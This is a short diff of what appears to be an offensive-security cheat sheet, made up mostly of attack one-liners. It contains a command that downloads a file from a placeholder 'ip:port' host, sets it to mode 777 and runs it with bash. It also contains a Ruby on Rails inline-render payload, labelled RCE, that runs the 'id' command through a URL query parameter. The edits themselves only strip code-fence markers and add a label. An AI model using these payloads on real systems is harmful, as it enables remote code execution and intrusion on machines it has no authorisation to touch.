@@ -1,4 +1,4 @@
-```# curl shell served
+# curl shell served
 
 curl -k http://ip:port/file -o file; chmod 777 file; bash file.sh 
 
@@ -48,6 +48,6 @@ reset
 
 xterm
 
-#ruby-on-rails render on User-supplied data
+#ruby-on-rails render on User-supplied data RCE
 
-[...]/pages?id[inline]=<%25%3D%60id%60%25>```
+[...]/pages?id[inline]=<%25%3D%60id%60%25>
